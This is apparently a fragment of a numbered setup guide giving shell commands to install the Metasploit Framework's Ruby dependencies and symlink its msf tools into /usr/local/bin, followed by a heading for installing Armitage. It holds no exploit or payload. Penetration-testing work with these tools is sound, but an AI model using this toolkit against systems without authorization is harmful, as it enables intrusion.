cd /opt/metasploit-framework
gem install bundler
bundle install
cd /opt/metasploit-framework
sudo bash -c 'for MSF in $(ls msf*); do ln -s /opt/metasploit-framework/$MSF /usr/local/bin/$MSF;done'

7. install armitage (6.sh)
